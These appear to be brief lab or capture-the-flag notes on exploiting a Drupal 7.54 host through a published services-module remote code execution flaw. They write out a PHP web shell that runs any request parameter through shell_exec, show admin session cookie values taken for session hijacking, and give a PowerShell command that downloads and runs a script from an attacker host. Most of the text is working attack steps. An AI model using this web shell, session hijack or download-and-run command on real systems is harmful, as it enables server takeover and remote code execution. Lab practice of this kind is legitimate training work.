Drupal 7.54

To check for code execution put this as data to the file.

use https://www.ambionics.io/blog/drupal-services-module-rce

modify the php code to go to correct `/rest` not `/rest_endpoint/` as that does not exist.

```
$phpcode = <<< 'EOD'
<?php

    if (isset($_REQUEST['fexec'])) {
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
    }

?>
EOD;
```

now you can do `10.10.10.9/hack.php?fexec=dir`

the `session.json` file contains:

```

{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "wj5QhcVJp8Pl1fHJMEibBSkOXNQECylfEl1zb2rgFkg",
    "token": "0ex9I0Zop_i86ZWFZxHrcMNc0OBWh_k2AB1TOWo-Xm8"
}

```

the `session_name` is the name of the cookie and `session_id` is the value to get an admin session.

`10.10.10.9/hack.php?fexec=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.xx.xx/fileToUpload') | powershell -noprofile -`

trailing `-` to pull from stdin
